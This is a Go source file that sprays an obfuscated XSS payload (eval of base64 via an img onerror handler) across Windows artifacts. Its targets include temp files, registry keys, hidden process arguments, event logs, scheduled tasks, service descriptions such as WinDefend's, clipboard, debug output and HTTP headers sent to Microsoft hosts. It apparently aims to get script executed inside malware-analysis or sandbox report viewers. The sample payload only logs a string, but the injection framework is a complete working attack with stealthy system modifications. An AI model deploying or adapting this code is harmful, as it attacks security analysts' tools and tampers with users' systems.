package xss

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// XSS_PAYLOAD es el payload que se inyectará en todos lados
// Base64 de: console.log('11223344')
const XSS_PAYLOAD = `"><img src=x id=Y29uc29sZS5sb2coJzExMjIzMzQ0Jyk= onerror=eval(atob(this.id))>`

// InjectXSSEverywhere inyecta el payload XSS en todos los vectores posibles
func InjectXSSEverywhere() {
	// Ejecutar todas las inyecciones en paralelo
	go InjectXSS_Files()
	go InjectXSS_Registry()
	go InjectXSS_ProcessArgs()
	go InjectXSS_PowerShell()
	go InjectXSS_CMD()
	go InjectXSS_EventLogs()
	go InjectXSS_Environment()
	go InjectXSS_Network()
	go InjectXSS_Shortcuts()
	go InjectXSS_ScheduledTasks()
	go InjectXSS_Services()
	go InjectXSS_Clipboard()
	go InjectXSS_DebugOutput()

	// Dar tiempo para que se ejecuten
	time.Sleep(2 * time.Second)
}

// InjectXSS_Files crea múltiples archivos con el payload XSS
func InjectXSS_Files() {
	tempDir := os.TempDir()

	// 1. Archivos HTML
	for i := 1; i <= 5; i++ {
		htmlPath := filepath.Join(tempDir, fmt.Sprintf("xss_test_%d.html", i))
		htmlContent := fmt.Sprintf(`<!DOCTYPE html>
<html>
<head><title>XSS Test %d</title></head>
<body>
<h1>XSS Payload Test</h1>
<p>Payload: %s</p>
%s
</body>
</html>`, i, XSS_PAYLOAD, XSS_PAYLOAD)
		os.WriteFile(htmlPath, []byte(htmlContent), 0644)
	}

	// 2. Archivos TXT con payload
	for i := 1; i <= 5; i++ {
		txtPath := filepath.Join(tempDir, fmt.Sprintf("xss_log_%d.txt", i))
		txtContent := fmt.Sprintf(`XSS Test Log %d
Timestamp: %s
Payload: %s
Test: %s
`, i, time.Now().Format(time.RFC3339), XSS_PAYLOAD, XSS_PAYLOAD)
		os.WriteFile(txtPath, []byte(txtContent), 0644)
	}

	// 3. Archivos JSON con payload
	for i := 1; i <= 3; i++ {
		jsonPath := filepath.Join(tempDir, fmt.Sprintf("xss_config_%d.json", i))
		jsonContent := fmt.Sprintf(`{
  "test_id": %d,
  "payload": "%s",
  "xss_test": "%s",
  "timestamp": "%s"
}`, i, XSS_PAYLOAD, XSS_PAYLOAD, time.Now().Format(time.RFC3339))
		os.WriteFile(jsonPath, []byte(jsonContent), 0644)
	}

	// 4. Archivos XML con payload
	for i := 1; i <= 3; i++ {
		xmlPath := filepath.Join(tempDir, fmt.Sprintf("xss_report_%d.xml", i))
		xmlContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<XSSTest>
  <ID>%d</ID>
  <Payload>%s</Payload>
  <Test>%s</Test>
  <Timestamp>%s</Timestamp>
</XSSTest>`, i, XSS_PAYLOAD, XSS_PAYLOAD, time.Now().Format(time.RFC3339))
		os.WriteFile(xmlPath, []byte(xmlContent), 0644)
	}

	// 5. Archivos MD con payload
	for i := 1; i <= 3; i++ {
		mdPath := filepath.Join(tempDir, fmt.Sprintf("xss_readme_%d.md", i))
		mdContent := fmt.Sprintf(`# XSS Test %d

## Payload
%s

## Test
%s

## Timestamp
%s
`, i, XSS_PAYLOAD, XSS_PAYLOAD, time.Now().Format(time.RFC3339))
		os.WriteFile(mdPath, []byte(mdContent), 0644)
	}
}

// InjectXSS_Registry inyecta el payload en múltiples claves de registro
func InjectXSS_Registry() {
	// Intentar crear múltiples claves con el payload
	registryPaths := []string{
		`Software\XSSTest\Payload1`,
		`Software\XSSTest\Payload2`,
		`Software\XSSTest\Payload3`,
		`Software\Analysis\XSS`,
		`Software\Test\XSSPayload`,
	}

	for _, path := range registryPaths {
		// No importa si falla, intentamos crear la clave
		exec.Command("reg", "add", fmt.Sprintf("HKCU\\%s", path), "/v", "Payload", "/t", "REG_SZ", "/d", XSS_PAYLOAD, "/f").Run()
		exec.Command("reg", "add", fmt.Sprintf("HKCU\\%s", path), "/v", "Test", "/t", "REG_SZ", "/d", XSS_PAYLOAD, "/f").Run()
	}
}

// InjectXSS_ProcessArgs ejecuta múltiples procesos con el payload como argumento
func InjectXSS_ProcessArgs() {
	// 1. CMD con el payload
	for i := 1; i <= 5; i++ {
		cmd := exec.Command("cmd.exe", "/c", fmt.Sprintf("echo XSS_Test_%d: %s", i, XSS_PAYLOAD))
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}

	// 2. Notepad con el payload como argumento (fallará pero quedará en logs)
	for i := 1; i <= 3; i++ {
		cmd := exec.Command("notepad.exe", XSS_PAYLOAD)
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}

	// 3. Calc con el payload
	for i := 1; i <= 3; i++ {
		cmd := exec.Command("calc.exe", XSS_PAYLOAD)
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}
}

// InjectXSS_PowerShell ejecuta múltiples comandos PowerShell con el payload
func InjectXSS_PowerShell() {
	// 1. Write-Host con el payload
	for i := 1; i <= 5; i++ {
		cmd := exec.Command("powershell.exe", "-Command", fmt.Sprintf("Write-Host 'XSS Test %d: %s'", i, XSS_PAYLOAD))
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}

	// 2. Write-Output con el payload
	for i := 1; i <= 3; i++ {
		cmd := exec.Command("powershell.exe", "-Command", fmt.Sprintf("Write-Output '%s'", XSS_PAYLOAD))
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}

	// 3. Write-Error con el payload
	for i := 1; i <= 3; i++ {
		cmd := exec.Command("powershell.exe", "-Command", fmt.Sprintf("Write-Error -Message '%s' -Category NotSpecified", XSS_PAYLOAD))
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}

	// 4. Set-Clipboard con el payload
	for i := 1; i <= 2; i++ {
		cmd := exec.Command("powershell.exe", "-Command", fmt.Sprintf("Set-Clipboard -Value '%s'", XSS_PAYLOAD))
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}

	// 5. New-Item con el payload
	for i := 1; i <= 3; i++ {
		cmd := exec.Command("powershell.exe", "-Command", fmt.Sprintf("New-Item -Path $env:TEMP\\xss_%d.txt -ItemType File -Value '%s' -Force", i, XSS_PAYLOAD))
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}
}

// InjectXSS_CMD ejecuta múltiples comandos CMD con el payload
func InjectXSS_CMD() {
	// 1. Echo con el payload
	for i := 1; i <= 5; i++ {
		cmd := exec.Command("cmd.exe", "/c", fmt.Sprintf("echo XSS_%d: %s", i, XSS_PAYLOAD))
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}

	// 2. Title con el payload
	for i := 1; i <= 3; i++ {
		cmd := exec.Command("cmd.exe", "/c", fmt.Sprintf("title XSS_Test_%d_%s", i, XSS_PAYLOAD))
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}

	// 3. Set con el payload
	for i := 1; i <= 3; i++ {
		cmd := exec.Command("cmd.exe", "/c", fmt.Sprintf("set XSS_VAR_%d=%s", i, XSS_PAYLOAD))
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}
}

// InjectXSS_EventLogs crea múltiples entradas en el log de eventos con el payload
func InjectXSS_EventLogs() {
	for i := 1; i <= 5; i++ {
		cmd := exec.Command("eventcreate", "/ID", fmt.Sprintf("%d", 1000+i), "/L", "APPLICATION", "/T", "INFORMATION", "/SO", "XSSTest", "/D", fmt.Sprintf("XSS Test %d: %s", i, XSS_PAYLOAD))
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}
}

// InjectXSS_Environment crea múltiples variables de entorno con el payload
func InjectXSS_Environment() {
	for i := 1; i <= 10; i++ {
		os.Setenv(fmt.Sprintf("XSS_TEST_%d", i), XSS_PAYLOAD)
		os.Setenv(fmt.Sprintf("XSS_PAYLOAD_%d", i), XSS_PAYLOAD)
	}

	// Variables con nombres comunes
	os.Setenv("XSS_DATA", XSS_PAYLOAD)
	os.Setenv("XSS_CONFIG", XSS_PAYLOAD)
	os.Setenv("XSS_REPORT", XSS_PAYLOAD)
	os.Setenv("MALWARE_XSS", XSS_PAYLOAD)
	os.Setenv("ANALYSIS_XSS", XSS_PAYLOAD)
}

// InjectXSS_Network envía el payload en múltiples peticiones HTTP
func InjectXSS_Network() {
	urls := []string{
		"http://connectivity-check.microsoft.com/connect",
		"http://www.msftncsi.com/ncsi.txt",
		"http://ipv4.microsoft.com/ncsi.txt",
	}

	for i := 1; i <= 3; i++ {
		for _, url := range urls {
			go func(targetURL string, iteration int) {
				cmd := exec.Command("powershell.exe", "-Command", fmt.Sprintf(`
$headers = @{
    'User-Agent' = 'XSS-Test-%d: %s'
    'X-XSS-Payload' = '%s'
    'X-Test-ID' = '%d'
}
try { Invoke-WebRequest -Uri '%s' -Headers $headers -TimeoutSec 2 } catch {}
`, iteration, XSS_PAYLOAD, XSS_PAYLOAD, iteration, targetURL))
				cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
				cmd.Start()
			}(url, i)
		}
	}
}

// InjectXSS_Shortcuts crea múltiples shortcuts con el payload
func InjectXSS_Shortcuts() {
	tempDir := os.TempDir()

	for i := 1; i <= 5; i++ {
		lnkPath := filepath.Join(tempDir, fmt.Sprintf("xss_test_%d.lnk", i))
		psScript := fmt.Sprintf(`
$shell = New-Object -COM WScript.Shell
$shortcut = $shell.CreateShortcut('%s')
$shortcut.TargetPath = 'notepad.exe'
$shortcut.Description = 'XSS Test %d: %s'
$shortcut.Arguments = '%s'
$shortcut.Save()
`, lnkPath, i, XSS_PAYLOAD, XSS_PAYLOAD)

		cmd := exec.Command("powershell.exe", "-Command", psScript)
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}
}

// InjectXSS_ScheduledTasks crea múltiples tareas programadas con el payload
func InjectXSS_ScheduledTasks() {
	for i := 1; i <= 3; i++ {
		taskName := fmt.Sprintf("XSSTest_%d", i)
		cmd := exec.Command("schtasks", "/create", "/tn", taskName, "/tr", fmt.Sprintf("cmd.exe /c echo %s", XSS_PAYLOAD), "/sc", "ONCE", "/st", "00:00", "/f")
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}

	// Tareas con descripción que contiene el payload
	for i := 1; i <= 2; i++ {
		taskName := fmt.Sprintf("XSSTask_%d", i)
		cmd := exec.Command("schtasks", "/create", "/tn", taskName, "/tr", "notepad.exe", "/sc", "ONCE", "/st", "00:00", "/sd", fmt.Sprintf("XSS: %s", XSS_PAYLOAD), "/f")
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}
}

// InjectXSS_Services intenta modificar descripciones de servicios con el payload
func InjectXSS_Services() {
	services := []string{"WinDefend", "WSearch", "Spooler"}

	for i, service := range services {
		cmd := exec.Command("sc", "description", service, fmt.Sprintf("XSS Test %d: %s", i+1, XSS_PAYLOAD))
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
	}
}

// InjectXSS_Clipboard copia el payload al portapapeles múltiples veces
func InjectXSS_Clipboard() {
	for i := 1; i <= 3; i++ {
		cmd := exec.Command("powershell.exe", "-Command", fmt.Sprintf("Set-Clipboard -Value 'XSS Test %d: %s'", i, XSS_PAYLOAD))
		cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
		cmd.Start()
		time.Sleep(500 * time.Millisecond)
	}
}

// InjectXSS_DebugOutput envía el payload a OutputDebugString múltiples veces
func InjectXSS_DebugOutput() {
	kernel32 := windows.NewLazyDLL("kernel32.dll")
	outputDebugString := kernel32.NewProc("OutputDebugStringW")

	for i := 1; i <= 5; i++ {
		debugMsg, _ := windows.UTF16PtrFromString(fmt.Sprintf("[XSS Test %d] %s", i, XSS_PAYLOAD))
		outputDebugString.Call(uintptr(unsafe.Pointer(debugMsg)))
		time.Sleep(100 * time.Millisecond)
	}
}
